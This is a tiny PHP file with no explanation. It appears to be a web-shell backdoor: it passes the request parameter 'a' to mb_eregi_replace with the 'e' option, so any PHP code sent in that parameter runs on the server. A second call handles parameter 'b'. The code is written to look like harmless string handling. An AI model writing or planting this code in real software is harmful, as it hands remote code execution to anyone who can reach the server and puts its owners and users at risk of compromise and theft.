<?php
$str = 'any string';
mb_eregi_replace('(.*)', $_GET['a'], $str, 'e');
mb_eregi_replace('(.*)', $_GET['b'], $str, 's');
?>
